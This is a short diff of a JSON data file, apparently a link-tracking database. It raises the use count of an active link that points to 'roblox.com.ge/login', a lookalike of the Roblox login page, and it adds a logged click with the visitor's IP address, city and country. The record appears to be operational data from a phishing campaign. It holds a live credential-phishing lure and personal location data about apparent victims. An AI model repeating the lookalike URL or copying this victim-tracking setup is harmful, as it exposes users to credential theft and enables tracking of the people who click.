@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1338,
+    "useCount": 1339,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10872,6 +10872,14 @@
         "city": "Casimiro de Abreu",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777410977978,
+        "ip": "86.133.26.144",
+        "country": "United Kingdom",
+        "city": "Wrexham",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
